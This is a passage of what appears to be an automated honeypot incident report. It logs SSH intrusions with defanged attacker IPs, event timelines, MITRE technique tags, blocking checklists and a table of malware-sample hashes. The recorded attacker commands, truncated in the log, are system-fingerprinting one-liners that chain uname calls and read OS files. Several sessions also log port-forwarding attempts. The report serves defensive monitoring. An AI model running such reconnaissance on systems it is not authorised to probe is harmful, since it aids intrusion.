| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:48:13` | `cowrie.session.connect` |
| `2026-08-04 12:48:13` | `cowrie.client.version` |
| `2026-08-04 12:48:13` | `cowrie.client.kex` |
| `2026-08-04 12:48:14` | `cowrie.login.success` |
| `2026-08-04 12:48:16` | `cowrie.session.params` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.success` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:16` | `cowrie.command.input` |
| `2026-08-04 12:48:17` | `cowrie.log.closed` |
| `2026-08-04 12:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6ab755721d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:48 |
| **Last Seen** | 2026-08-04 12:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:48:21` | `cowrie.session.connect` |
| `2026-08-04 12:48:21` | `cowrie.client.version` |
| `2026-08-04 12:48:21` | `cowrie.client.kex` |
| `2026-08-04 12:48:21` | `cowrie.login.success` |
| `2026-08-04 12:48:22` | `cowrie.session.params` |
| `2026-08-04 12:48:22` | `cowrie.command.input` |
| `2026-08-04 12:48:22` | `cowrie.log.closed` |
| `2026-08-04 12:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5274d2b900d2

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-08-04 12:48 |
| **Last Seen** | 2026-08-04 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:48:59` | `cowrie.session.connect` |
| `2026-08-04 12:48:59` | `cowrie.client.version` |
| `2026-08-04 12:48:59` | `cowrie.client.kex` |
| `2026-08-04 12:49:00` | `cowrie.login.success` |
| `2026-08-04 12:49:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:49:00` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d840de05147e

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]210` |
| **First Seen** | 2026-08-04 12:49 |
| **Last Seen** | 2026-08-04 12:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:49:57` | `cowrie.session.connect` |
| `2026-08-04 12:49:57` | `cowrie.client.version` |
| `2026-08-04 12:49:57` | `cowrie.client.kex` |
| `2026-08-04 12:49:58` | `cowrie.login.success` |
| `2026-08-04 12:49:58` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:49:58` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]210` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b29b57b81d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:50 |
| **Last Seen** | 2026-08-04 12:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:50:02` | `cowrie.session.connect` |
| `2026-08-04 12:50:02` | `cowrie.client.version` |
| `2026-08-04 12:50:02` | `cowrie.client.kex` |
| `2026-08-04 12:50:04` | `cowrie.login.success` |
| `2026-08-04 12:50:05` | `cowrie.session.params` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.success` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:05` | `cowrie.command.input` |
| `2026-08-04 12:50:06` | `cowrie.log.closed` |
| `2026-08-04 12:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29275bf030d6

| Field | Detail |
|---|---|
| **Source IP** | `183.239.20[.]236` |
| **First Seen** | 2026-08-04 12:50 |
| **Last Seen** | 2026-08-04 12:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:50:05` | `cowrie.session.connect` |
| `2026-08-04 12:50:06` | `cowrie.client.version` |
| `2026-08-04 12:50:06` | `cowrie.client.kex` |
| `2026-08-04 12:50:08` | `cowrie.login.success` |
| `2026-08-04 12:50:09` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.239.20[.]236` to AbuseIPDB if not already reported
- [ ] Block `183.239.20[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e753c2b291f8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:50 |
| **Last Seen** | 2026-08-04 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:50:07` | `cowrie.session.connect` |
| `2026-08-04 12:50:07` | `cowrie.client.version` |
| `2026-08-04 12:50:07` | `cowrie.client.kex` |
| `2026-08-04 12:50:08` | `cowrie.login.success` |
| `2026-08-04 12:50:08` | `cowrie.session.params` |
| `2026-08-04 12:50:08` | `cowrie.command.input` |
| `2026-08-04 12:50:09` | `cowrie.log.closed` |
| `2026-08-04 12:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281d48b529ea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:51 |
| **Last Seen** | 2026-08-04 12:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:51:40` | `cowrie.session.connect` |
| `2026-08-04 12:51:40` | `cowrie.client.version` |
| `2026-08-04 12:51:40` | `cowrie.client.kex` |
| `2026-08-04 12:51:42` | `cowrie.login.success` |
| `2026-08-04 12:51:44` | `cowrie.session.params` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.success` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.command.input` |
| `2026-08-04 12:51:44` | `cowrie.log.closed` |
| `2026-08-04 12:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9cab0af7552

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:51 |
| **Last Seen** | 2026-08-04 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:51:48` | `cowrie.session.connect` |
| `2026-08-04 12:51:48` | `cowrie.client.version` |
| `2026-08-04 12:51:48` | `cowrie.client.kex` |
| `2026-08-04 12:51:49` | `cowrie.login.success` |
| `2026-08-04 12:51:50` | `cowrie.session.params` |
| `2026-08-04 12:51:50` | `cowrie.command.input` |
| `2026-08-04 12:51:50` | `cowrie.log.closed` |
| `2026-08-04 12:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae341f5a1263

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:53 |
| **Last Seen** | 2026-08-04 12:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:53:18` | `cowrie.session.connect` |
| `2026-08-04 12:53:18` | `cowrie.client.version` |
| `2026-08-04 12:53:18` | `cowrie.client.kex` |
| `2026-08-04 12:53:21` | `cowrie.login.success` |
| `2026-08-04 12:53:22` | `cowrie.session.params` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.success` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:22` | `cowrie.command.input` |
| `2026-08-04 12:53:23` | `cowrie.log.closed` |
| `2026-08-04 12:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5bb0e87b422

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:53 |
| **Last Seen** | 2026-08-04 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:53:25` | `cowrie.session.connect` |
| `2026-08-04 12:53:25` | `cowrie.client.version` |
| `2026-08-04 12:53:25` | `cowrie.client.kex` |
| `2026-08-04 12:53:25` | `cowrie.login.success` |
| `2026-08-04 12:53:26` | `cowrie.session.params` |
| `2026-08-04 12:53:26` | `cowrie.command.input` |
| `2026-08-04 12:53:26` | `cowrie.log.closed` |
| `2026-08-04 12:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-121c55510355

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:54 |
| **Last Seen** | 2026-08-04 12:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:54:56` | `cowrie.session.connect` |
| `2026-08-04 12:54:56` | `cowrie.client.version` |
| `2026-08-04 12:54:56` | `cowrie.client.kex` |
| `2026-08-04 12:54:58` | `cowrie.login.success` |
| `2026-08-04 12:55:00` | `cowrie.session.params` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.success` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.command.input` |
| `2026-08-04 12:55:00` | `cowrie.log.closed` |
| `2026-08-04 12:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **10** | 2026-08-04 08:56 | 2026-08-04 12:53 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **8** | 2026-08-04 09:18 | 2026-08-04 12:38 | 3m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **6** | 2026-08-04 10:13 | 2026-08-04 10:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.201.104[.]216` | **4** | 2026-08-04 11:30 | 2026-08-04 11:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `130.12.182[.]225` | **4** | 2026-08-04 11:47 | 2026-08-04 11:47 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.152.99[.]77` | **4** | 2026-08-04 09:37 | 2026-08-04 09:42 | 6m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-04 12:53 | 2026-08-04 12:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-04 09:20 | 2026-08-04 09:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-04 11:37 | 2026-08-04 11:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-08-04 11:54 | 2026-08-04 11:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-08-04 12:02 | 2026-08-04 12:41 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `43.226.38[.]71` | **3** | 2026-08-04 10:51 | 2026-08-04 10:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]94` | **3** | 2026-08-04 08:59 | 2026-08-04 08:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.210[.]85` | **2** | 2026-08-04 09:00 | 2026-08-04 09:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]104` | **2** | 2026-08-04 09:56 | 2026-08-04 09:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]73` | **2** | 2026-08-04 10:21 | 2026-08-04 10:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.225[.]252` | 1 | 2026-08-04 10:35 | 2026-08-04 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.12.86[.]145` | 1 | 2026-08-04 10:17 | 2026-08-04 10:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.105.210[.]82` | 1 | 2026-08-04 09:00 | 2026-08-04 09:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.54.222[.]23` | 1 | 2026-08-04 11:17 | 2026-08-04 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.50.218[.]37` | 1 | 2026-08-04 11:10 | 2026-08-04 11:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.69.255[.]239` | 1 | 2026-08-04 11:56 | 2026-08-04 11:56 | 18s | 0 | `T1592` | 🟢 LOW |
| `118.131.69[.]86` | 1 | 2026-08-04 11:57 | 2026-08-04 11:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.196.142[.]135` | 1 | 2026-08-04 11:03 | 2026-08-04 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.70.97[.]100` | 1 | 2026-08-04 10:54 | 2026-08-04 10:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-08-04 09:00 | 2026-08-04 09:01 | 43s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-08-04 12:54 | 2026-08-04 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | 1 | 2026-08-04 10:31 | 2026-08-04 10:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]15` | 1 | 2026-08-04 10:42 | 2026-08-04 10:43 | 8s | 0 | `T1592` | 🟢 LOW |
| `194.44.132[.]162` | 1 | 2026-08-04 11:36 | 2026-08-04 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-04 12:02 | 2026-08-04 12:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]100` | 1 | 2026-08-04 11:15 | 2026-08-04 11:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `220.180.166[.]214` | 1 | 2026-08-04 11:05 | 2026-08-04 11:05 | 5s | 0 | `T1592` | 🟢 LOW |
| `31.14.32[.]5` | 1 | 2026-08-04 09:59 | 2026-08-04 09:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.77.227[.]120` | 1 | 2026-08-04 10:13 | 2026-08-04 10:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-04 10:07 | 2026-08-04 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-04 12:16 | 2026-08-04 12:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-08-04 12:35 | 2026-08-04 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-04 09:36 | 2026-08-04 09:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.11.42[.]221` | 1 | 2026-08-04 08:55 | 2026-08-04 08:55 | 33s | 0 | `T1592` | 🟢 LOW |
| `59.63.163[.]2` | 1 | 2026-08-04 08:57 | 2026-08-04 08:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]162` | 1 | 2026-08-04 12:44 | 2026-08-04 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]143` | 1 | 2026-08-04 11:56 | 2026-08-04 11:57 | 15s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]60` | 1 | 2026-08-04 10:44 | 2026-08-04 10:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-08-04 10:04 | 2026-08-04 10:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]72` | 1 | 2026-08-04 09:45 | 2026-08-04 09:45 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
